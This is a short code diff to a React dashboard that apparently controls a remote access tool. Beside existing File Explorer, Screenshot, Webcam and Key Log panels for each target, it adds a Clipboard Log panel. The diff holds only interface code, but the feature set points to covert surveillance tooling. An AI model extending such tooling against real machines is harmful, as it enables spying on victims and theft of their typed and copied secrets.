@@ -27,7 +27,8 @@ export default function Main() {
       { i: "File Explorer", x: 0, y: 0, w: 4, h: 14 },
       { i: "Screenshot", x: 8, y: 0, w: 4, h: 8 },
       { i: "Webcam", x: 8, y: 4, w: 4, h: 8 },
-      { i: "Key Log", x: 4, y: 7, w: 4, h: 6 }
+      { i: "Key Log", x: 4, y: 7, w: 4, h: 6 },
+      { i: "Clipboard Log", x: 4, y: 7, w: 4, h: 6 }
     ],
     { persist: `layout-${api.target.name}` }
   );
@@ -57,6 +58,13 @@ export default function Main() {
       component: <TextListView name="Key log" event="DUMP_KEY_LOG" />,
       features: ["DUMP_KEY_LOG"],
       key: "Key Log"
+    },
+    {
+      component: (
+        <TextListView name="Clipboard log" event="DUMP_CLIPBOARD_LOG" />
+      ),
+      features: ["DUMP_CLIPBOARD_LOG"],
+      key: "Clipboard Log"
     }
   ];
 
